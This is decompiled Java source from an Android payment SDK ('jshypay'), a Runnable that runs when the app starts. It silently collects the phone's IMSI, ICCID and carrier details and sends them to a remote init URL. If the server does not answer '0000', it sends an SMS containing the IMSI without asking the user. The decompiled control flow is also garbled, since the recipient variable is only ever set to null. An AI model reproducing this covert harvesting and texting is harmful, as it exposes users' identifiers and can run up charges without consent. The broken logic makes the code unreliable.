package com.jshymedia.jshypay;

import android.app.PendingIntent;
import android.content.Intent;
import android.content.SharedPreferences;
import android.content.SharedPreferences.Editor;
import android.telephony.SmsManager;
import com.jshymedia.jshypay.net.Purl;
import com.jshymedia.jshypay.soimsi.ImsiMobileBean;
import com.jshymedia.jshypay.soimsi.SoImsiHelper;
import com.jshymedia.jshypay.ztool.ZNetManager;
import com.jshymedia.jshypay.ztool.ZPhoneInfo;
import com.jshymedia.jshypay.ztool.Zlog;
import java.io.UnsupportedEncodingException;
import java.net.URLEncoder;

final class d
  implements Runnable
{
  d(JshyPayApplication paramJshyPayApplication, String paramString1, String paramString2) {}
  
  public final void run()
  {
    Zlog.syso("on..Net..!.init.....!");
    Object localObject2 = new StringBuffer();
    Object localObject3 = SoImsiHelper.getImsiInfo(this.b);
    if (localObject3 != null) {}
    String str1;
    for (;;)
    {
      try
      {
        Object localObject1 = URLEncoder.encode(((ImsiMobileBean)localObject3).getSheng(), "utf-8");
        ((StringBuffer)localObject2).append("&cs=" + ((ImsiMobileBean)localObject3).getService() + "&cc=" + (String)localObject1);
        localObject1 = Purl.makeUrl(Purl.init_url, this.a) + "&iccid=" + this.c + ((StringBuffer)localObject2).toString();
        Zlog.syso("init_url:" + (String)localObject1);
        localObject1 = ZNetManager.getByteFromNet((String)localObject1, null, 0, null);
        if (localObject1 != null)
        {
          localObject1 = new String((byte[])localObject1);
          Zlog.syso("init:" + (String)localObject1);
          if (!((String)localObject1).equals("0000")) {
            break;
          }
          JshyPayApplication.a(this.a).edit().remove("appinit").putBoolean("appinit", true).commit();
          JshyPayApplication.a(this.a).edit().remove("appImsi").putString("appImsi", ZPhoneInfo.getIMSI(this.a)).commit();
        }
        return;
      }
      catch (UnsupportedEncodingException localUnsupportedEncodingException)
      {
        localUnsupportedEncodingException.printStackTrace();
        str1 = null;
        continue;
      }
      ((StringBuffer)localObject2).append("&cs=&cc=");
    }
    localObject2 = SmsManager.getDefault();
    localObject3 = new Intent("FIRST_SEND");
    localObject3 = PendingIntent.getBroadcast(this.a.getApplicationContext(), 1001, (Intent)localObject3, 1073741824);
    Object localObject4 = new Intent("FIRST_SEND");
    localObject4 = PendingIntent.getBroadcast(this.a.getApplicationContext(), 1002, (Intent)localObject4, 1073741824);
    String str2 = ZPhoneInfo.getIMSI(this.a.getApplicationContext());
    try
    {
      ((SmsManager)localObject2).sendTextMessage(str1, null, str2, (PendingIntent)localObject3, (PendingIntent)localObject4);
      JshyPayApplication.a(this.a).edit().remove("appinit").putBoolean("appinit", true).commit();
      JshyPayApplication.a(this.a).edit().remove("appImsi").putString("appImsi", ZPhoneInfo.getIMSI(this.a)).commit();
      return;
    }
    catch (Exception localException) {}
  }
}
